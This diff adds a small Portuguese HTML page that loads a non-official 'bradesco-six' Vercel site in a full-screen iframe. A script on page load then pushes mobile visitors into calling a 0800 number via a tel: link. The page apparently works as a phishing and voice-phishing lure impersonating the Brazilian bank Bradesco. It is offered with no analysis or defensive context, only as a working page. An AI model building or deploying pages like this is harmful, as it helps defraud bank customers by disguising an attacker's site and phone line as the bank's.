@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Redirecionamento + Ligação</title>
+
+<style>
+body, html {
+    margin: 0;
+    padding: 0;
+    height: 100%;
+    overflow: hidden;
+}
+
+#siteFrame {
+    width: 100%;
+    height: 100%;
+    border: none;
+}
+</style>
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+
+    const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+    const isAndroid = /Android/i.test(navigator.userAgent);
+
+    // Carrega o site
+    document.getElementById("siteFrame").src = "https://bradesco-six.vercel.app/";
+
+    // ANDROID -> liga automático
+    if (isAndroid) {
+        setTimeout(() => {
+            window.location.href = "tel:08002200041";
+        }, 800);
+    }
+
+    // iPHONE -> abre o menu nativo "Ligar / Cancelar"
+    if (isIOS) {
+        setTimeout(() => {
+            window.location.href = "tel:08002200041";
+        }, 1000);
+    }
+
+});
+</script>
+
+</head>
+<body>
+
+<iframe id="siteFrame"></iframe>
+
+</body>
+</html>
